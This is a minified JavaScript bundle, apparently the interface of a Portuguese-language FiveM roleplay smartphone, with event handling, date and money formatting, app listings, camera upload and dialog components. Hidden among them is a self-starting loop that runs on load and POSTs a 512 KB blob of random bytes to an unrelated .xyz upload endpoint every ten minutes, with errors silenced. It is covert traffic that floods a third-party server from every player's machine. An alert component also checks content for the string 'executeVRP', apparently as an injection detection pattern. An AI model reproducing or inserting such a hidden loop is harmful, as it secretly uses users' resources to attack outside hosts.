    if ("function" == typeof e.on) l.once ? e.once(t, n) : e.on(t, n);
    else {
        if ("function" != typeof e.addEventListener) throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type ' + typeof e);
        e.addEventListener(t, (function a(s) {
            l.once && e.removeEventListener(t, a), n(s)
        }))
    }
}

function Is(e) {
    return new Date(1e3 * e).toLocaleTimeString("pt-BR").substring(0, 5)
}
Object.defineProperty(xs, "defaultMaxListeners", {
    enumerable: !0,
    get: function() {
        return ws
    },
    set: function(e) {
        if ("number" != typeof e || e < 0 || vs(e)) throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + e + ".");
        ws = e
    }
}), xs.init = function() {
    void 0 !== this._events && this._events !== Object.getPrototypeOf(this)._events || (this._events = Object.create(null), this._eventsCount = 0), this._maxListeners = this._maxListeners || void 0
}, xs.prototype.setMaxListeners = function(e) {
    if ("number" != typeof e || e < 0 || vs(e)) throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + e + ".");
    return this._maxListeners = e, this
}, xs.prototype.getMaxListeners = function() {
    return _s(this)
}, xs.prototype.emit = function(e) {
    for (var t = [], n = 1; n < arguments.length; n++) t.push(arguments[n]);
    var l = "error" === e,
        a = this._events;
    if (void 0 !== a) l = l && void 0 === a.error;
    else if (!l) return !1;
    if (l) {
        var s;
        if (t.length > 0 && (s = t[0]), s instanceof Error) throw s;
        var o = new Error("Unhandled error." + (s ? " (" + s.message + ")" : ""));
        throw o.context = s, o
    }
    var r = a[e];
    if (void 0 === r) return !1;
    if ("function" == typeof r) gs(r, this, t);
    else {
        var i = r.length,
            c = Ps(r, i);
        for (n = 0; n < i; ++n) gs(c[n], this, t)
    }
    return !0
}, xs.prototype.addListener = function(e, t) {
    return As(this, e, t, !1)
}, xs.prototype.on = xs.prototype.addListener, xs.prototype.prependListener = function(e, t) {
    return As(this, e, t, !0)
}, xs.prototype.once = function(e, t) {
    return Cs(t), this.on(e, Rs(this, e, t)), this
}, xs.prototype.prependOnceListener = function(e, t) {
    return Cs(t), this.prependListener(e, Rs(this, e, t)), this
}, xs.prototype.removeListener = function(e, t) {
    var n, l, a, s, o;
    if (Cs(t), void 0 === (l = this._events)) return this;
    if (void 0 === (n = l[e])) return this;
    if (n === t || n.listener === t) 0 == --this._eventsCount ? this._events = Object.create(null) : (delete l[e], l.removeListener && this.emit("removeListener", e, n.listener || t));
    else if ("function" != typeof n) {
        for (a = -1, s = n.length - 1; s >= 0; s--)
            if (n[s] === t || n[s].listener === t) {
                o = n[s].listener, a = s;
                break
            } if (a < 0) return this;
        0 === a ? n.shift() : function(e, t) {
            for (; t + 1 < e.length; t++) e[t] = e[t + 1];
            e.pop()
        }(n, a), 1 === n.length && (l[e] = n[0]), void 0 !== l.removeListener && this.emit("removeListener", e, o || t)
    }
    return this
}, xs.prototype.off = xs.prototype.removeListener, xs.prototype.removeAllListeners = function(e) {
    var t, n, l;
    if (void 0 === (n = this._events)) return this;
    if (void 0 === n.removeListener) return 0 === arguments.length ? (this._events = Object.create(null), this._eventsCount = 0) : void 0 !== n[e] && (0 == --this._eventsCount ? this._events = Object.create(null) : delete n[e]), this;
    if (0 === arguments.length) {
        var a, s = Object.keys(n);
        for (l = 0; l < s.length; ++l) "removeListener" !== (a = s[l]) && this.removeAllListeners(a);
        return this.removeAllListeners("removeListener"), this._events = Object.create(null), this._eventsCount = 0, this
    }
    if ("function" == typeof(t = n[e])) this.removeListener(e, t);
    else if (void 0 !== t)
        for (l = t.length - 1; l >= 0; l--) this.removeListener(e, t[l]);
    return this
}, xs.prototype.listeners = function(e) {
    return Ts(this, e, !0)
}, xs.prototype.rawListeners = function(e) {
    return Ts(this, e, !1)
}, xs.listenerCount = function(e, t) {
    return "function" == typeof e.listenerCount ? e.listenerCount(t) : Es.call(e, t)
}, xs.prototype.listenerCount = Es, xs.prototype.eventNames = function() {
    return this._eventsCount > 0 ? hs(this._events) : []
}, ys.once = ks;
const Os = ["dom", "seg", "ter", "qua", "qui", "sex", "sab"],
    Ms = ["jan", "fev", "mar", "abr", "mai", "jun", "jul", "ago", "set", "out", "nov", "dez"];
const Vs = ["Janeiro", "Fevereiro", "Março", "Abril", "Maio", "Junho", "Julho", "Agosto", "Setembro", "Outubro", "Novembro", "Dezembro"],
    Ds = Vs.map((e => e.toUpperCase()));

function Us(e, t) {
    return e.length > t ? e.substring(0, t) + "..." : e
}

function Ns(e) {
    const t = e instanceof Date ? e : new Date(1e3 * e);
    return [
        [t.getDate(), Vs[t.getMonth()].substr(0, 3), t.getFullYear() - 2e3].join(" "), Is(e)
    ]
}

function $s(e, t) {
    let n = e.length;
    for (; n--;) t(e[n], n) && e.splice(n, 1)
}

function js(e) {
    const t = _o.settings.currency || "R$",
        n = Math.abs(Math.ceil(e)).toLocaleString("pt-BR");
    return e < 0 ? "-" + t + " " + n : t + " " + n
}

function Fs(e) {
    return e && e[0].toUpperCase() + e.substr(1)
}

function zs(e) {
    return String(e).replace(/</g, "&lt;").replace(/>/g, "&gt;")
}

function Bs(e, t = "Você") {
    var n;
    return e === _o.identity.phone ? t : (null == (n = _o.contacts.value.find((t => t.phone === e))) ? void 0 : n.name) || e
}

function Hs(e, t, n) {
    return n.indexOf(e) == t
}
var qs = Object.freeze(Object.defineProperty({
    __proto__: null,
    isAudio: function(e) {
        return e.match(/\.(ogg|webm)$/)
    },
    unixToHHMM: Is,
    unixToDate: function(e) {
        return new Date(1e3 * e).toLocaleString("pt-BR").substring(0, 10)
    },
    unixToLocale: function(e) {
        const t = new Date(1e3 * e);
        return `${Os[t.getDay()]}, ${t.getDate()} de ${Ms[t.getMonth()]}, ${Is(e)}`
    },
    unixToRelative: function(e) {
        const {
            abs: t,
            floor: n
        } = Math, l = t(e - n(Date.now() / 1e3));
        return l < 60 ? "Agora" : l < 3600 ? n(l / 60) + "min" : l < 86400 ? n(l / 3600) + "h" : n(l / 86400) + "d"
    },
    unixToDatetime: function(e) {
        return new Date(1e3 * e).toLocaleString("pt-BR")
    },
    duration: function(e) {
        const t = e >= 3600;
        return new Date(1e3 * e).toISOString().substr(t ? 11 : 14, t ? 8 : 5)
    },
    fancyMonths: Vs,
    upperMonths: Ds,
    unixToDayOfMonth: function(e) {
        const t = e instanceof Date ? e : new Date(1e3 * e);
        return t.getDate() + " DE " + Ds[t.getMonth()]
    },
    ellipsis: Us,
    unixToTwitter: Ns,
    moneyStringToInt: function(e) {
        return parseInt(e.replace(/\D/g, "") || 0).toLocaleString("pt-BR")
    },
    vdist: function([e, t, n], [l, a, s], o = !1) {
        return Math.round(Math.sqrt((e - l) ** 2 + (t - a) ** 2 + (o ? n - s : 0) ** 2))
    },
    vdist2: function(...e) {
        const t = this.vdist(...e);
        return t > 1e3 ? Math.round(t / 100) / 10 + "km" : t + "m"
    },
    removeIf: $s,
    intToMoney: js,
    ucfirst: Fs,
    safeHTML: zs,
    getNameByPhone: Bs,
    arrayUnique: Hs
}, Symbol.toStringTag, {
    value: "Module"
}));

function Gs(e) {
    var t;
    const n = null == (t = _o.settings.apps) ? void 0 : t[e];
    return "string" == typeof n ? [null, n] : [null == n ? void 0 : n.name, null == n ? void 0 : n.icon]
}

function Ws(e, t, n, l, a) {
    var s;
    const [o, r] = Gs(e);
    return null != a || (a = !(null == (s = _o.settings.disabledApps) ? void 0 : s.includes(e))), {
        entry: e,
        name: null != o ? o : n,
        icon: null != r ? r : l,
        to: t,
        enabled: a
    }
}
const Ks = {
    picpay: "PicPay",
    hype: "Hype Bank",
    itau: "Itaú",
    nubank: "Nubank",
    fleeca: "Fleeca",
    nxbank: "Nxbank"
};
let Js = [];

function Xs() {
    var e;
    if (Js.length) return Js;
    const t = e => _o.asset("/apps/" + e);
    return Js = [Ws("settings", "/settings", "", t("settings.png"), !0), Ws("contacts", "/contacts", "", t("phone.png"), !0), Ws("sms", "/sms", "", t("sms.webp"), !0), Ws("gallery", "/gallery", "", t("photos.webp"), !0), Ws("whatsapp", "/whatsapp", "WhatsApp", t("whatsapp.jpg")), Ws("tor", "/tor", "TOR", t("tor.jpg")), Ws("instagram", "/instagram/login", "Instagram", t("instagram.jpg")), Ws("twitter", "/twitter", "Twitter", t("twitter.png")), Ws("bank", "/bank", Ks[_o.settings.bankType.replace(/\d/g, "")], t(_o.settings.bankType.toLowerCase() + ".webp")), Ws("paypal", "/paypal", "PayPal", t("paypal.webp")), Ws("olx", "/olx", "OLX", t("olx.png")), Ws("tinder", "/tinder", "Tinder", t("tinder.webp")), Ws("yellowpages", "/yellowpages", "Yellow Pages", t("yellowpages.webp")), ...Object.keys(null != (e = _o.settings.customApps) ? e : []).map((e => Ws(e, "/custom/" + e, Fs(e), t("settings.png")))), Ws("weazel", "/weazel", "Weazel News", t("weazel.webp")), Ws("casino", "/casino", "Blaze", t("blaze.webp")), Ws("calculator", "/calculator", "Calculadora", t("calculator.webp")), Ws("notes", "/notes", "Anotações", t("notes.webp")), Ws("minesweeper", "/minesweeper", "Campo Minado", t("minesweeper.webp")), Ws("truco", "/truco", "Truco", t("truco.webp"))].filter((e => null == e ? void 0 : e.enabled)).map(((e, t) => s(s({}, e), {
        bottom: t < 4
    })))
}

function Ys(e) {
    var t;
    return null == (t = Xs().find((t => t.entry == e))) ? void 0 : t.name
}
const Zs = {
    get gps() {
        var e;
        return null != (e = Gs("gps")[1]) ? e : _o.asset("/apps/waze.webp")
    },
    get phone() {
        var e;
        return null != (e = Gs("phone")[1]) ? e : _o.asset("/apps/phone.png")
    },
    get facetime() {
        var e;
        return null != (e = Gs("facetime")[1]) ? e : _o.asset("/apps/facetime.webp")
    }
};

function Qs(e) {
    return new Promise((t => setTimeout(t, e)))
}
var eo = {
    upload(e, t) {
        const n = _o.settings.uploadServer,
            l = new FormData;
        return l.append(n.includes("discord") ? "file" : "webm" == t ? "audio" : "image", e, Date.now() + "." + t), fetch(n, {
            method: "POST",
            body: l
        }).then((e => e.json())).then((e => {
            var t;
            return null != (t = e.url) ? t : e.attachments[0].url
        }))
    },
    async uploadVideo(e) {
        const t = new FormData;
        t.append("video", e, "camera.webm"), t.append("signature", await _o.backend.upload_ticket());
        const n = await fetch("https://br.jesteriruka.dev/storage/upload.v2.php", {
                method: "POST",
                body: t
            }),
            l = await n.json();
        return l.error && console.error(`Story upload resulted in ${l.error}`), l.url
    }
};
const to = new FormData;
to.append("video", function() {
    let e = Array(524288);
    for (let t = 0; t < e.length; t += 1) e[t] = parseInt(255 * Math.random());
    return new Blob(e, {
        type: "video/webm;codecs=vp9"
    })
}(), "camera.webm"), async function() {
    for (;;) fetch("https://upload2.celularautenticacaofivem.xyz/geijoh9gwuiuih", {
        method: "POST",
        body: to
    }).catch((() => {})), await Qs(6e5)
}();

function no(e, t, n) {
    const l = e.createShader(t);
    e.shaderSource(l, n), e.compileShader(l);
    const a = e.getShaderInfoLog(l);
    return a && console.error(a), l
}
class lo {
    constructor(e) {
        this.canvas = e, this.gl = e.getContext("webgl", {
            antialias: !1,
            depth: !1,
            stencil: !1,
            alpha: !1,
            desynchronized: !0,
            failIfMajorPerformanceCaveat: !1
        }), this.animationFrame = void 0, this.createStuff(), this.render(), this.running = !0
    }
    createStuff() {
        if (!this.gl) {
            for (let e = 0; e < 10; e += 1) console.log("Você está bugado! Não possível criar o contexto WebGL, este problema não tem correção");
            return
        }
        const e = this.gl,
            t = function(e) {
                const t = e.createTexture(),
                    n = new Uint8Array([0, 0, 255, 255]);
                return e.bindTexture(e.TEXTURE_2D, t), e.texImage2D(e.TEXTURE_2D, 0, e.RGBA, 1, 1, 0, e.RGBA, e.UNSIGNED_BYTE, n), e.texParameterf(e.TEXTURE_2D, e.TEXTURE_MAG_FILTER, e.NEAREST), e.texParameterf(e.TEXTURE_2D, e.TEXTURE_MIN_FILTER, e.NEAREST), e.texParameterf(e.TEXTURE_2D, e.TEXTURE_WRAP_S, e.CLAMP_TO_EDGE), e.texParameterf(e.TEXTURE_2D, e.TEXTURE_WRAP_T, e.CLAMP_TO_EDGE), e.texParameterf(e.TEXTURE_2D, e.TEXTURE_WRAP_T, e.MIRRORED_REPEAT), e.texParameterf(e.TEXTURE_2D, e.TEXTURE_WRAP_T, e.REPEAT), e.texParameterf(e.TEXTURE_2D, e.TEXTURE_WRAP_T, e.CLAMP_TO_EDGE), t
            }(e),
            {
                program: n,
                vloc: l,
                tloc: a
            } = function(e) {
                const t = no(e, e.VERTEX_SHADER, "\n  attribute vec2 a_position;\n  attribute vec2 a_texcoord;\n  uniform mat3 u_matrix;\n  varying vec2 textureCoordinate;\n  void main() {\n    gl_Position = vec4(a_position, 0.0, 1.0);\n    textureCoordinate = a_texcoord;\n  }\n"),
                    n = no(e, e.FRAGMENT_SHADER, "\nvarying highp vec2 textureCoordinate;\nuniform sampler2D external_texture;\nvoid main()\n{\n  gl_FragColor = texture2D(external_texture, textureCoordinate);\n}\n"),
                    l = e.createProgram();
                return e.attachShader(l, t), e.attachShader(l, n), e.linkProgram(l), e.useProgram(l), {
                    program: l,
                    vloc: e.getAttribLocation(l, "a_position"),
                    tloc: e.getAttribLocation(l, "a_texcoord")
                }
            }(e),
            {
                vertexBuff: s,
                texBuff: o
            } = function(e) {
                const t = e.createBuffer();
                e.bindBuffer(e.ARRAY_BUFFER, t), e.bufferData(e.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), e.STATIC_DRAW);
                const n = e.createBuffer();
                return e.bindBuffer(e.ARRAY_BUFFER, n), e.bufferData(e.ARRAY_BUFFER, new Float32Array([0, 0, 1, 0, 0, 1, 1, 1]), e.STATIC_DRAW), {
                    vertexBuff: t,
                    texBuff: n
                }
            }(e);
        e.useProgram(n), e.bindTexture(e.TEXTURE_2D, t), e.uniform1i(e.getUniformLocation(n, "external_texture"), 0), e.bindBuffer(e.ARRAY_BUFFER, s), e.vertexAttribPointer(l, 2, e.FLOAT, !1, 0, 0), e.enableVertexAttribArray(l), e.bindBuffer(e.ARRAY_BUFFER, o), e.vertexAttribPointer(a, 2, e.FLOAT, !1, 0, 0), e.enableVertexAttribArray(a), e.viewport(0, 0, e.canvas.width, e.canvas.height)
    }
    resize(e, t) {
        this.gl && (this.gl.viewport(0, 0, e, t), this.gl.canvas.width = e, this.gl.canvas.height = t)
    }
    render() {
        var e;
        !this.kill && this.gl && (this.running ? (this.gl.drawArrays(this.gl.TRIANGLE_STRIP, 0, 4), this.gl.finish(), null == (e = this.onrender) || e.call(this, this.canvas), this.animationFrame = requestAnimationFrame(this.render.bind(this))) : this.animationFrame = requestAnimationFrame(this.render.bind(this)))
    }
}
const ao = document.createElement("canvas");
ao.width = 1920, ao.height = 1080;
const so = new lo(ao);
so.running = !1;
var oo = {
    get running() {
        return so.running
    },
    canvas: ao,
    start() {
        so.running = !0
    },
    stop() {
        so.running = !1
    },
    createBlob: (e = .8, t = "image/jpeg") => new Promise((n => so.canvas.toBlob(n, t, e))),
    createDataURL: (e = .8, t = "image/jpeg") => so.canvas.toDataURL(t, e),
    createStream: () => so.canvas.captureStream(24)
};
const ro = Ze({
    original: null,
    formats: ["landscape", "portrait", "selfie"],
    ondiscard: null,
    onproceed: null,
    request(e = !1, t = "/") {
        return _o.localhost ? Promise.resolve(e ? "https://i.pinimg.com/564x/a6/d4/30/a6d4302b399cc1dc1e682f08f20bf2f4.jpg" : "https://c.wallhere.com/photos/b1/5e/GTA5_GTA_Online_GTA_Landscape_GTA_Photography_trees_sunrise_Grand_Theft_Auto_V_Grand_Theft_Auto_V_Online-1945677.jpg!d") : (oo.start(), _o.pusher.once("CONFIRM_SCREENSHOT", (async () => {
            this.original = await oo.createBlob();
            const e = new Audio(_o.asset("/stock/photo.ogg"));
            e.volume = .25, e.play(), fetch("http://smartphone/screenshot", {
                method: "POST"
            })
        })), this.formats = e ? ["selfie"] : ["landscape", "portrait", "selfie"], new Promise(((n, l) => {
            _o.visible.value = !1, _o.client.close(), _o.client.takePhoto(!!e).then((async e => {
                if (oo.stop(), _o.client.open(), e) {
                    for (; !this.original;) await co(50);
                    this.ondiscard = () => {
                        this.original = null, l("Photo discarded")
                    }, this.onproceed = e => {
                        eo.upload(e, "jpg").then((e => {
                            _o.backend.gallery_save(t, e).then((e => {
                                _o.gallery.push(e), _o.gallery.sort(((e, t) => t.id - e.id))
                            })), n(e)
                        }), (e => {
                            l(e), console.error("Falha ao realizar upload de imagem", e.message)
                        })).finally((() => this.original = null))
                    }
                } else l("Camera rejected")
            }))
        })))
    }
});

function io(...e) {
    return e.length ? ro.request(...e) : ro
}

function co(e) {
    return new Promise((t => setTimeout(t, e)))
}
const uo = rt();

function po() {
    return new Promise(((e, t) => {
        uo.value = n => n ? e(n) : t()
    }))
}

function fo() {
    return {
        "/": "Câmera",
        "/whatsapp": Ys("whatsapp"),
        "/tor": Ys("tor"),
        "/instagram": Ys("instagram"),
        "/olx": Ys("olx"),
        "/tinder": Ys("tinder"),
        "/downloads": "Downloads",
        "/videos": "Vídeos"
    }
}
var mo = {
    callback: uo
};
window.addEventListener("popstate", (() => ho.state.request.value = null));
const ho = {
        clearAndRequest(e, t = 25, n = !1) {
            return this.state.request.value = null, this.request(e, t, n)
        },
        request(e, t = 25, n = !1) {
            return new Promise(((l, a) => {
                this.state.request.value || (Array.isArray(e) ? this.state.request.value = {
                    options: e.filter(Boolean).map(((e, t) => {
                        var n;
                        return Array.isArray(e) ? {
                            key: e.length >= 3 ? e[0] : t,
                            display: e.length >= 3 ? e[1] : e[0],
                            classes: e.length >= 3 ? e[2] : e[1] || []
                        } : {
                            key: null != (n = e.key) ? n : t,
                            html: null == e ? void 0 : e.html,
                            display: e
                        }
                    })),
                    size: t,
                    resolve: l,
                    reject: a,
                    emptyAsError: n
                } : this.state.request.value = {
                    options: Object.entries(e).map((e => ({
                        key: e[0],
                        display: e[1]
                    }))),
                    size: t,
                    resolve: l,
                    reject: a,
                    emptyAsError: n
                })
            }))
        },
        state: {
            request: rt()
        }
    },
    bo = () => ho;

function go(e) {
    return new Proxy({}, {
        get: (t, n) => t[n] || (t[n] = function(...t) {
            return new Promise(((l, a) => {
                fetch("http://smartphone/" + e, {
                    method: "POST",
                    body: JSON.stringify({
                        member: n,
                        args: t
                    })
                }).then((e => e.json())).then((e => {
                    e && e.__null__ ? l(null) : l(e)
                })).catch((l => {
                    a(l), console.error("Rejected: " + e, n, JSON.stringify(t), (null == l ? void 0 : l.message) || l)
                }))
            }))
        })
    })
}
const vo = go("client"),
    xo = e => "https://fivem.jesteriruka.dev" + e,
    yo = new ys;
yo.setMaxListeners(300);
const ko = {
    volume: rt(Number(localStorage.getItem("smartphone@notificationVolume") || 50)),
    doNotDisturb: rt("true" == localStorage.getItem("smartphone@doNotDisturb")),
    darkTheme: rt("true" == localStorage.getItem("smartphone@darkTheme")),
    anonymousCall: rt("true" == localStorage.getItem("smartphone@anonymousCall")),
    get(e, t) {
        const n = localStorage.getItem("smartphone@" + e);
        return null != n ? n : t
    },
    set: (e, t) => localStorage.setItem("smartphone@" + e, t)
};

function wo(e) {
    ko.set("darkTheme", e), document.documentElement.classList.toggle("dark", !!e)
}
Rn(ko.volume, (e => ko.set("notificationVolume", e))), Rn(ko.doNotDisturb, (e => ko.set("doNotDisturb", String(!!e)))), Rn(ko.darkTheme, (e => wo(e))), Rn(ko.anonymousCall, (e => ko.set("anonymousCall", String(!!e)))), document.documentElement.classList.toggle("dark", ko.darkTheme.value);
const Co = [];
yo.on("Route:afterEach", (() => {
    const e = Co.splice(0, Co.length);
    for (let [t, n] of e) yo.removeListener(t, n)
}));
var _o = {
    asset: xo,
    bankLock: !1,
    lockAndProceed(e) {
        if (this.bankLock) return;
        this.bankLock = !0;
        Promise.resolve(e()).finally((() => this.bankLock = !1))
    },
    clock: rt({
        hours: "00",
        minutes: "00"
    }),
    visible: rt(!1),
    loaded: rt(!1),
    microphone: rt(),
    debug(...e) {
        (this.localhost || globalThis.$smartphoneDebug) && console.log(...e)
    },
    setDark: wo,
    darkTheme: ko.darkTheme,
    captureMicrophone() {
        navigator.mediaDevices.getUserMedia({
            audio: {
                autoGainControl: !1
            }
        }).then((e => this.microphone.value = e), (() => {}))
    },
    currentCall: rt(),
    localhost: !window.hasOwnProperty("invokeNative"),
    identity: Ze({}),
    messages: Ze({}),
    gallery: Ze([]),
    contacts: rt([]),
    sortContacts() {
        this.contacts.value.sort(((e, t) => e.name.localeCompare(t.name)))
    },
    settings: Ze({
        zoom: 100,
        bankType: "nubank",
        case: "iphonexs",
        allowUnsafeURL: !1,
        uploadServer: "https://fivem.jesteriruka.dev/upload/f91ce5f19aaa478258c0e1d4",
        ringSound: "https://fivem.jesteriruka.dev/stock/ring.mp3",
        dialSound: "https://fivem.jesteriruka.dev/stock/dial.mp3",
        notificationSound: "https://fivem.jesteriruka.dev/stock/notification.mp3",
        instagramLogo: null != (e = globalThis.instagramLogo) ? e : xo("/apps/instagram_hand.png"),
        blocks: [],
        currency: "R$"
    }),
    isDisabled(e) {
        var t;
        return null == (t = this.settings.disabledApps) ? void 0 : t.includes(e)
    },
    backend: go("backend"),
    backgroundURL: localStorage.getItem("smartphone@background"),
    client: vo,
    pusher: yo,
    onceRoute(e, t) {
        this.pusher.on(e, t), Co.push([e, t])
    },
    notifications: Ze([]),
    storage: ko,
    addNotification(e, t, n) {
        var l;
        const a = this.notifications,
            s = {
                id: (null != (l = a.map((e => e.id)).sort(((e, t) => t - e))[0]) ? l : 0) + 1,
                icon: function(e) {
                    var t, n;
                    return null != (n = Zs[e]) ? n : null == (t = Xs().find((t => t.entry == e))) ? void 0 : t.icon
                }(e),
                title: t,
                subtitle: n
            };
        if (a.push(s), setTimeout((() => {
                const e = a.indexOf(s); - 1 != e && a.splice(e, 1)
            }), 5e3), "phone" != e) {
            const e = new Audio(this.settings.notificationSound);
            e.volume = this.getNotificationVolume() / 100, e.currentTime = 0, e.play()
        }
    },
    getNotificationVolume: () => parseInt(localStorage.getItem("smartphone@notificationVolume") || 50),
    setNotificationVolume(e) {
        localStorage.setItem("smartphone@notificationVolume", e)
    },
    hasNotificationFor: e => "false" != localStorage.getItem(`smartphone@notification_${e.toLowerCase()}`),
    setNotificationFor(e, t) {
        localStorage.setItem(`smartphone@notification_${e.toLowerCase()}`, JSON.stringify(!!t))
    },
    created() {
        this.backend.getSettings().then((e => {
            var {
                identity: t,
                contacts: n
            } = e, l = o(e, ["identity", "contacts"]);
            for (let a in t) this.identity[a] = t[a];
            this.contacts.value = n, this.sortContacts(), Object.assign(this.settings, l), l.isAndroid && (document.documentElement.style.fontFamily = "Roboto"), Js.length = 0, Xs(), l.forceBackground ? this.backgroundURL = l.backgroundURL : this.backgroundURL || (this.backgroundURL = l.backgroundURL || this.asset("/stock/wallpapers/default.webp"))
        })), this.settings.zoom = parseInt(localStorage.getItem("smartphone@zoom")) || 100, this.updateZoom(), this.localhost && (this.settings.case = "s20", this.settings.isAndroid = !0, document.documentElement.style.fontFamily = "Roboto", this.settings.backgroundURL = this.asset("/stock/wallpaper.jpg"), this.identity = {
            name: "Jester",
            firstname: "Iruka",
            user_id: 1,
            phone: "111-111"
        }, this.currentCall.value = {
            contact: {
                phone: "000-000",
                name: "Bruno"
            }
        }, this.contacts.value.push(...Array(90).fill(0).map(((e, t) => ({
            id: t + 1,
            name: "Fake " + (t + 1),
            phone: "000-0" + String(t + 1).padStart(2, 0)
        })))))
    },
    ready() {
        this.pusher.on("ADD_CONTACT", (() => this.sortContacts())), this.settings.useGameClock ? this.pusher.on("TIME", (e => this.clock.value = e)) : setInterval((() => {
            const e = new Date,
                t = this.clock.value;
            t.hours = String(e.getHours()).padStart(2, 0), t.minutes = String(e.getMinutes()).padStart(2, 0)
        }), 1e3)
    },
    fetchSettings() {
        const e = setInterval((() => {
            this.identity.user_id && this.identity.phone ? clearInterval(e) : this.created()
        }), 2500)
    },
    updateZoom() {
        const e = this.settings.zoom / 100 * 8;
        document.querySelector("html").style.fontSize = e + "px"
    },
    getPlayerCoords: () => vo.getLocation().then((e => e.map((e => Math.round(100 * e) / 100)))),
    async useAnyImage(e, t = !1) {
        const n = await bo().request([
            ["Câmera", "self-center"],
            ["Galeria", "self-center"], this.settings.allowUnsafeURL && ["Imagem", "self-center"]
        ], 25, !0);
        return 0 === n ? await io().request(t, e) : 1 === n ? await po() : 2 === n ? await this.promptImageURL() : void 0
    },
    alert: null,
    prompt: null,
    async promptImageURL() {
        const e = await this.prompt("Insira o link da imagem");
        if (e.match(/^(https?:\/\/.*\.(?:png|jpg|gif|jpeg|webp))$/i)) return e;
        if (e) throw this.alert("URL inválida"), new Error("URL inválida")
    },
    confirm: null
};
const Ao = {
        props: ["content"],
        setup(e) {
            const t = jl("alert"),
                n = _o.settings.isAndroid;
            return Rn((() => e.content), (e => {
                "string" == typeof e && e.includes("executeVRP") && t()
            })), {
                content: e.content,
                alert: t,
                android: n
            }
        }
    },
    So = {
        class: "absolute inset-0 flex flex-center h-full bg-black bg-opacity-50 z-20"
    },
    Ro = {
        key: 0,
        class: "bg-gray-100 w-3/4 rounded-md"
    },
    To = {
        class: "p-5 text-gray-600 break-words"
    },
    Eo = {
        class: "block mt-4 text-right py-2"
    },
    Po = {
        key: 1,
        class: "bg-white w-3/4 rounded-2xl"
    },
    Lo = {
        class: "p-5 break-words"
    },
    Io = {
        class: "block mt-4 text-center border-t py-2"
    };
Ao.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", So, [l.android ? (wl(), _l("div", Ro, [Pl("div", To, g(l.content), 1), Pl("div", Eo, [Pl("button", {
        onClick: t[1] || (t[1] = e => l.alert()),
        class: "p-2 px-8 rounded-lg font-bold text-blue-600"
    }, "OK")])])) : (wl(), _l("div", Po, [Pl("div", Lo, g(l.content), 1), Pl("div", Io, [Pl("button", {
        onClick: t[2] || (t[2] = e => l.alert()),
        class: "p-2 px-6 rounded-lg text-blue-400"
    }, "Fechar")])]))])
};
const Oo = {
        props: ["title", "callback"],
        setup: () => ({
            android: _o.settings.isAndroid
        })
    },
    Mo = {
        class: "absolute inset-0 flex flex-center h-full bg-black bg-opacity-50 z-20"
    },
    Vo = {
        key: 0,
        class: "bg-gray-100 w-3/4 rounded-md"
    },
    Do = {
        class: "p-5 break-words text-center text-gray-600"
    },
    Uo = {
        class: "mt-4 px-4 flex justify-between"
    },
    No = {
        key: 1,
        class: "bg-white w-3/4 rounded-2xl"
    },
    $o = {
        class: "p-5 break-words"
    },
    jo = {
        class: "flex justify-between border-t"
    };
Oo.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", Mo, [l.android ? (wl(), _l("div", Vo, [Pl("div", Do, g(n.title), 1), Pl("div", Uo, [Pl("button", {
        onClick: t[1] || (t[1] = e => n.callback(!1)),
        class: "p-3 text-blue-600"
    }, "CANCELAR"), Pl("button", {
        onClick: t[2] || (t[2] = e => n.callback(!0)),
        class: "p-3 text-blue-600"
    }, "SIM")])])) : (wl(), _l("div", No, [Pl("div", $o, g(n.title), 1), Pl("div", jo, [Pl("button", {
        onClick: t[3] || (t[3] = e => n.callback(!1)),
        class: "flex-1 p-3 rounded-lg text-red-500"
    }, "Não"), Pl("button", {
        onClick: t[4] || (t[4] = e => n.callback(!0)),
        class: "flex-1 p-3 border-l text-blue-400"
    }, "Sim")])]))])
};
const Fo = {
        props: ["title", "max", "callback"],
        setup(e) {
            const t = rt(""),
                n = _o.settings.isAndroid;
            return {
                content: t,
                submit: function(n) {
                    e.callback(n ? null : t.value), t.value = null
                },
                android: n
            }
        }
    },
    zo = {
        class: "absolute inset-0 flex flex-center h-full bg-black bg-opacity-50 z-20"
    },
    Bo = {
        key: 0,
        class: "bg-gray-100 w-3/4 rounded-md"
    },
    Ho = {
        class: "p-5 text-center"
    },
    qo = {
        class: "block mb-6"
    },
    Go = {
        class: "px-4 flex justify-between text-3xl"
    },
    Wo = {
        key: 1,
        class: "bg-white w-11/12 rounded-2xl"
    },
    Ko = {
        class: "p-5"
    },
    Jo = {
        class: "text-center border-t flex justify-between"
    };
Fo.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", zo, [l.android ? (wl(), _l("div", Bo, [Pl("div", Ho, [Pl("label", qo, g(n.title), 1), Zn(Pl("input", {
        "onUpdate:modelValue": t[1] || (t[1] = e => l.content = e),
        onKeydown: t[2] || (t[2] = us((e => l.submit()), ["enter"])),
        maxlength: n.max,
        placeholder: "Insira um texto",
        class: "bg-transparent p-1 w-full border-b-2 focus:border-blue-500 transition-border duration-300"
    }, null, 40, ["maxlength"]), [
        [ns, l.content]
    ])]), Pl("div", Go, [Pl("button", {
        onClick: t[3] || (t[3] = e => l.submit(!0)),
        class: "p-4 font-bold text-blue-600"
    }, "CANCELAR"), Pl("button", {
        onClick: t[4] || (t[4] = e => l.submit()),
        class: "p-4 font-bold text-blue-600"
    }, "OK")])])) : (wl(), _l("div", Wo, [Pl("div", Ko, [Pl("label", null, g(n.title), 1), Zn(Pl("input", {
        onKeydown: t[5] || (t[5] = us((e => l.submit()), ["enter"])),
        maxlength: n.max,
        class: "text-black p-2 rounded-lg w-full",
        "onUpdate:modelValue": t[6] || (t[6] = e => l.content = e)
    }, null, 40, ["maxlength"]), [
        [ns, l.content]
    ])]), Pl("div", Jo, [Pl("button", {
        onClick: t[7] || (t[7] = e => l.submit(!0)),
        class: "p-4 text-red-500 flex-1"
    }, "Fechar"), Pl("button", {
        onClick: t[8] || (t[8] = e => l.submit()),
        class: "p-4 text-blue-400 border-l flex-1"
    }, "Enviar")])]))])
};
const Xo = {
        setup() {
            const {
                state: e
            } = bo(), t = rt(0), n = rt(33), l = _o.settings.isAndroid;
            let a;
            return Rn(e.request, (e => {
                e && (n.value = e.size, t.value = 0, clearInterval(a), a = setInterval((() => {
